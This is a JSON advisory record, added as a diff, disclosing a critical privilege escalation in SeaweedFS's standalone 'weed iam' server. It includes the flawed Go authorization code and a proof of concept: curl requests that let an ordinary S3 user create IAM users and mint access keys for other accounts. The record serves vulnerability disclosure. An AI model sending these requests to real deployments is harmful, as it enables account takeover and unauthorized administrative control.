@@ -1,0 +1,44 @@
+{
+  "global": null,
+  "id": "GHSA-jw56-gm6j-34mp",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "### Summary\r\n\r\nThe standalone `weed iam` server (deprecated but still shipped in v4.40) routes all IAM management actions through a single `POST /` endpoint. The authorization check always calls `VerifyActionPermission` with an empty bucket and object, which causes the policy evaluator to resolve the IAM management action to `s3:*` against the resource ARN `arn:aws:s3:::`. Any policy statement containing `Action: s3:*` and `Resource: *`, a routine grant for S3 data-plane access, matches both, so the check passes. An authenticated S3 identity with no IAM administration rights can create users, mint access keys for arbitrary accounts, and attach admin policies to itself.\r\n\r\n### Deployment and configuration\r\n\r\n- **Components running:** master, volume, filer, and the standalone `weed iam` server\r\n- **Attacker-reachable port:** the `weed iam` HTTP port (default 8111)\r\n- **Authentication:** IAM auth active; identities loaded from a `-config` file or the filer credential store. The attacker holds a valid access key for any identity that has one attached IAM policy with `Action: s3:*` and `Resource: *`.\r\n- **Attacker's starting position:** a valid S3 user with a standard broad data-access policy. Not unauthenticated, and not an admin.\r\n\r\n**Trust boundary crossed:** privilege escalation from a normal S3 user to administrative capability over the full IAM credential store.\r\n\r\n### Details\r\n\r\n**File:** `weed/iamapi/iamapi_server.go`\r\n**Line 130 (registerRouter)**\r\n\r\n```go\r\n// Single POST / route - no bucket or object path variable.\r\n// bucket=\"\" and object=\"\" flow into VerifyActionPermission for every request.\r\napiRouter.Methods(http.MethodPost).Path(\"/\").\r\n    HandlerFunc(iama.iam.Auth(iama.DoActions, ACTION_ADMIN))\r\n```\r\n\r\nThe `Auth` middleware resolves to `VerifyActionPermission(r, identity, ACTION_ADMIN, \"\", \"\")`. For identities with attached IAM policies, `VerifyActionPermission` routes to `evaluateIAMPolicies`.\r\n\r\n**File:** `weed/s3api/auth_credentials.go`\r\n**Lines 2368-2420 (evaluateIAMPolicies) - no empty-bucket guard**\r\n\r\n```go\r\nresource := buildResourceARN(bucket, resourceObject)\r\n// bucket=\"\" → buildResourceARN(\"\",\"\") → \"arn:aws:s3:::\"\r\n\r\ns3Action := ResolveS3Action(r, string(action), bucket, resourceObject)\r\n// bucket=\"\" → falls through to mapBaseActionToS3Format(\"Admin\") → \"s3:*\"\r\n\r\n// Policy {\"Action\":\"s3:*\",\"Resource\":\"*\"} matches both → explicitAllow = true\r\n```\r\n\r\n`buildResourceARN(\"\", \"\")` returns `\"arn:aws:s3:::\"`. `ResolveS3Action` with an empty bucket falls through to `mapBaseActionToS3Format(\"Admin\")`, which returns `\"s3:*\"`. The policy statement `{\"Effect\":\"Allow\",\"Action\":\"s3:*\",\"Resource\":\"*\"}`, the direct equivalent of AWS's `AmazonS3FullAccess` managed policy, matches both values. The function returns `true` and `VerifyActionPermission` returns `ErrNone`, authorizing the caller.\r\n\r\nThe sibling function `CanDo`, used for legacy-actions identities, applies an explicit empty-bucket guard at line 1800 that `evaluateIAMPolicies` does not:\r\n\r\n```go\r\nif bucket == \"\" {\r\n    return false   // CanDo rejects empty bucket; evaluateIAMPolicies does not\r\n}\r\n```\r\n\r\nThe current-default embedded IAM path (`weed s3 -iam=true`) is not affected. It passes a fixed pseudo-resource to `VerifyActionPermission`: `Action(\"iam:\"+action)` and `\"arn:aws:iam:::*\"`. The `\"iam:\"` prefix prevents any `s3:*` policy from matching the action string. The standalone `weed iam` server was not updated to use the same approach.\r\n\r\n### PoC\r\n\r\nReproduced against a binary built from commit `5269d93fa8d2245cb12d76bcfe1096a12f3178f5` (08/05/26).\r\n\r\nIdentity `victim2` holds only `PowerUserPolicy`: `{\"Effect\":\"Allow\",\"Action\":\"s3:*\",\"Resource\":\"*\"}`. It has no `Actions:[\"Admin\"]` field and no IAM-specific grant of any kind.\r\n\r\n**Attack: create a new IAM user**\r\n\r\n```bash\r\ncurl -s -X POST http://example:8111/ \\\r\n  -H \"Authorization: AWS4-HMAC-SHA256 Credential=victim2key/...\" \\\r\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\r\n  --data \"Action=CreateUser&UserName=attacker-controlled&Version=2010-05-08\"\r\n# HTTP 200: <CreateUserResponse>...<UserName>attacker-controlled</UserName>...\r\n```\r\n\r\nExpected: HTTP 403, because `victim2` holds no IAM administration rights.\r\nActual: HTTP 200. The user `attacker-controlled` is created in the credential store.\r\n\r\n**Escalation: mint a working access key for any existing user**\r\n\r\n```bash\r\ncurl -s -X POST http://example:8111/ \\\r\n  -H \"Authorization: AWS4-HMAC-SHA256 Credential=victim2key/...\" \\\r\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\r\n  --data \"Action=CreateAccessKey&UserName=any-other-user&Version=2010-05-08\"\r\n# HTTP 200: live AccessKeyId and SecretAccessKey returned for a user victim2 does not own\r\n```\r\n\r\nExpected: HTTP 403.\r\nActual: HTTP 200. A new, working access key pair is returned for `any-other-user`, completing an account takeover without that user's knowledge.\r\n\r\n**Negative control:** an identity with zero attached policies returns HTTP 403 on the same request, confirming the bypass is specific to identities with broad `s3:*` policy statements.\r\n\r\n### Impact\r\n\r\nAny deployment running the standalone `weed iam` server alongside IAM-enabled S3, with at least one identity that holds a broad data-plane policy, is vulnerable.\r\n\r\nAn attacker with a valid S3 access key for such an identity can do the following:\r\n\r\n- Create new IAM users and access keys with arbitrary names\r\n- Mint live access key pairs for any existing user in the credential store, taking over their account without their credentials or knowledge\r\n- Attach admin policies to itself or any user, permanently escalating to full administrative access\r\n- Delete users or access keys belonging to other accounts in the credential store\r\n\r\nNo additional privileges beyond a standard S3 data-access key are required.",
+    "ghsa_id": "GHSA-jw56-gm6j-34mp",
+    "html_url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-jw56-gm6j-34mp",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-jw56-gm6j-34mp"
+      }
+    ],
+    "published_at": "2026-09-02T16:12:15Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Standalone `weed iam` server grants any broad-policy S3 identity full IAM administration rights, allowing privilege escalation to admin",
+    "updated_at": "2026-09-02T16:12:15Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/seaweedfs/seaweedfs"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 4.40"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "seaweedfs/seaweedfs"
+}
